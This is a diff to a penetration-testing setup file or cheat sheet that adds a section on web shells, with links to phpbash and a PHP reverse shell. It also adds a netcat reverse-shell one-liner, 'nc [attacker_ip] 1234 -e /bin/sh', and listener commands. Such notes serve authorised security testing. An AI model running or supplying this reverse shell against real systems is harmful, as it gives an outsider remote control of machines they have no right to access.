@@ -121,9 +121,23 @@ git clone https://github.com/OJ/gobuster.git
 #######################
 ### WEB SHELLS ########
 #######################
+##########PHP SHELLS################
 #PHP BASH
 cd /pentest/tools
 #https://github.com/Arrexel/phpbash
 git clone https://github.com/Arrexel/phpbash.git
+#php-reverse-shell
+http://pentestmonkey.net/tools/web-shells/php-reverse-shell
 
+######################################
+######NETCAT shells on target
+#######################################
+nc [attacker_ip] 1234 -e /bin/sh
 
+#################LISTENERS#################################
+
+####a simple netcat listener on TCP 1234
+nc -v -n -l -p 1234
+
+### an msf listener
+msfconsole
